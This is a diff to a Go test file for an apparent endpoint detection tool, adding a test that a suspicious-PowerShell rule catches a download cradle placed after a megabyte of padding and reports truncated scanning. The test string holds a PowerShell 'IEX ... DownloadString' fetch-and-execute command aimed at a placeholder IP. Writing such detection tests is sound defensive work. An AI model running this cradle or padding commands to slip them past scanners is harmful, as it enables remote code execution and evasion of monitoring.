@@ -6,6 +6,7 @@ import (
 	"testing"
 	"time"
 	"unicode/utf16"
+	"unicode/utf8"
 
 	"github.com/efij/AgentDFIR/v4/internal/endpoint"
 	"github.com/efij/AgentDFIR/v4/internal/schema"
@@ -86,6 +87,26 @@ func TestSuspiciousPowerShell(t *testing.T) {
 	c := cov["WIN_AGENT_SUSPICIOUS_POWERSHELL"]
 	if len(by) != 0 || c.Evaluated || !strings.Contains(c.Missing, "script-block records are present") {
 		t.Fatalf("incomplete: %+v %+v", by, c)
+	}
+}
+
+// Padding is not a hiding place: a cradle placed after a megabyte of
+// filler is still seen, and the coverage says the line was cut.
+func TestHostRulesScanPaddedTail(t *testing.T) {
+	cradle := "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"
+	pad := strings.Repeat("# ", 1<<19)
+	recs := append(winTree(),
+		hproc(4, 6300, 6200, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "powershell.exe -nop -c "+pad+cradle),
+	)
+	by, cov := hostRun(t, nil, recs...)
+	if len(by["WIN_AGENT_SUSPICIOUS_POWERSHELL"]) != 1 {
+		t.Fatalf("payload after padding missed: %+v", by)
+	}
+	if c := cov["WIN_AGENT_SUSPICIOUS_POWERSHELL"]; !strings.Contains(c.Partial, "scanned at head and tail only") {
+		t.Fatalf("truncation not reported: %+v", c)
+	}
+	if s, cut := capScan(strings.Repeat("é", hostScanMax)); !cut || !utf8.ValidString(s) {
+		t.Fatalf("cut=%v valid=%v", cut, utf8.ValidString(s))
 	}
 }
 
